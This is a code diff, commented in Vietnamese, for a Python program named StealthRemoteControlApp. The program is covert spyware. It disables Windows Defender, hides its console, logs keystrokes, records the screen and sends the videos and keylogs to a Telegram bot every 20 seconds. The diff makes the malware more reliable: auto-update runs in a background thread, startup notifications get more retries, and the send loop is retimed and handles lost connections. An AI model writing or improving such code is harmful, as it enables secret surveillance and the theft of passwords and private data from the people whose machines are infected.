@@ -115,11 +115,16 @@ class StealthRemoteControlApp:
         if DISABLE_DEFENDER:
             self.anti_detection.run_all()
         
-        # Kiểm tra và cập nhật tự động
-        try:
-            self.updater.auto_update()
-        except:
-            pass
+        # Kiểm tra và cập nhật tự động khi khởi động
+        def auto_update_on_startup():
+            try:
+                time.sleep(5)  # Đợi một chút để đảm bảo internet sẵn sàng
+                if self.internet_checker.is_online():
+                    self.updater.auto_update()
+            except:
+                pass
+        
+        threading.Thread(target=auto_update_on_startup, daemon=True).start()
         
         # Khởi động clipboard monitor
         def start_clipboard_monitor():
@@ -147,10 +152,13 @@ class StealthRemoteControlApp:
         # Gửi thông báo khi kích hoạt thành công
         def send_startup_notification():
             # Đợi có internet trước
-            self.internet_checker.wait_for_connection()
+            try:
+                self.internet_checker.wait_for_connection()
+            except:
+                return
             
-            # Đợi bot sẵn sàng
-            max_retries = 20
+            # Đợi bot sẵn sàng và gửi thông báo
+            max_retries = 30
             retry_count = 0
             while retry_count < max_retries:
                 try:
@@ -249,10 +257,19 @@ class StealthRemoteControlApp:
             # Quay cố định 20 giây
             duration = RECORD_DURATION
             
-            # Quay màn hình
+            # Quay màn hình (mất khoảng 20 giây)
             video_path = record_screen(duration=duration)
             
             if not video_path or not os.path.exists(video_path):
+                return False
+            
+            # Kiểm tra lại internet sau khi quay (có thể mất kết nối trong lúc quay)
+            if not self.internet_checker.is_online():
+                try:
+                    if os.path.exists(video_path):
+                        os.remove(video_path)
+                except:
+                    pass
                 return False
             
             # Lấy keylog đầy đủ để gửi kèm trong caption
@@ -280,7 +297,7 @@ class StealthRemoteControlApp:
                     if len(keylog_content) > 3500:
                         caption += f"\n... (truncated, total: {len(keylog_content)} chars)"
                 
-                # Gửi video
+                # Gửi video ngay lập tức
                 video_success = self.telegram.send_video_sync(
                     video_path,
                     caption=caption
@@ -288,7 +305,6 @@ class StealthRemoteControlApp:
                 
                 # Xóa video sau khi gửi thành công
                 if video_success:
-                    time.sleep(1)  # Đợi một chút để đảm bảo file đã được gửi
                     try:
                         if os.path.exists(video_path):
                             os.remove(video_path)
@@ -392,16 +408,7 @@ class StealthRemoteControlApp:
         # Đảm bảo ứng dụng chạy ẩn hoàn toàn
         hide_console()
         
-        # Gửi thông báo khởi động thành công (nếu chưa gửi)
-        try:
-            if self.telegram.bot and self.internet_checker.is_online():
-                startup_msg = f"🟢 Ứng dụng đã khởi động và đang chạy!\n\n"
-                startup_msg += f"🆔 Machine: {self.machine_short_id}\n"
-                startup_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-                startup_msg += f"✅ Sẽ gửi video + keylog mỗi 20 giây"
-                self.telegram.send_text_sync(startup_msg)
-        except:
-            pass
+        # Không cần gửi thông báo ở đây vì đã có thread riêng gửi
         
         self.running = True
         # Keylogger đã được khởi động trong __init__, không cần start lại
@@ -538,11 +545,15 @@ class StealthRemoteControlApp:
                     # Quay và gửi video kèm keylog định kỳ (mỗi 20 giây)
                     if self.last_video_send == 0:
                         self.last_video_send = current_time
-                    if current_time - self.last_video_send >= VIDEO_SEND_INTERVAL:
+                    
+                    # Kiểm tra đã đến lúc gửi chưa (20 giây kể từ lần gửi cuối)
+                    elapsed = current_time - self.last_video_send
+                    if elapsed >= VIDEO_SEND_INTERVAL:
                         try:
+                            # Gửi ngay lập tức
                             success = self.record_and_send_with_keylog()
                             if success:
-                                self.last_video_send = current_time
+                                self.last_video_send = time.time()  # Cập nhật thời gian gửi thành công
                             else:
                                 # Nếu gửi thất bại, thử lại sau 5 giây
                                 time.sleep(5)
@@ -555,15 +566,15 @@ class StealthRemoteControlApp:
                             except:
                                 pass
                             time.sleep(5)
+                    else:
+                        # Chưa đến lúc gửi, đợi thêm
+                        time.sleep(2)
                 else:
                     # Không có internet, đợi đến khi có kết nối
                     try:
                         self.internet_checker.wait_for_connection()
                     except:
                         time.sleep(10)
-                
-                # Đợi một chút trước lần kiểm tra tiếp theo
-                time.sleep(2)  # Kiểm tra mỗi 2 giây để đảm bảo gửi đúng 20s
                 
         except KeyboardInterrupt:
             self.stop()
